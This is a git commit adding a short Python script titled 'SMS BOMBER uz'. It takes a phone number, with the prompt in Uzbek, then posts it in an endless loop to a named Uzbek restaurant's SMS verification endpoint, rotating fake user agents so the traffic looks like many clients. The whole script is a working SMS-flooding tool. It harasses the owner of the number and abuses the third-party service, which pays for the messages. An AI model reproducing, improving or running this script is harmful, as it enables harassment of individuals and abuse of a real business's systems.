7d9a4f515c90f1db92b2ceaea370e6921e3cdc1c
Qorashohk <137509248+Qorashohk@users.noreply.github.com>
2023-06-23 17:37:17 +0500

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,21 @@
+import requests, fake_useragent, time
+import pyfiglet
+from termcolor import colored
 
+text=pyfiglet.print_figlet(text="SMS BOMBER uz", colors="BLUE")
+
+user = fake_useragent.UserAgent().random
+headers = {'user_agent' : user}
+NUMBER = input(colored('Telfon Raqamingizni Kiriting: (Misol Uchun +998) ' , 'red') )
+
+while True:
+    user = fake_useragent.UserAgent().random
+    headers = {'user_agent' : user}
+
+    try:
+        response = requests.post('https://io.bellissimo.uz/api/verify-web', headers=headers, data={'phone' : NUMBER})
+        print(colored('* Xabar Yuborilmoqda', 'blue'))
+    except:
+        print('Nmadur Xato Ketti Brat :(')
+
+        time.sleep(5)
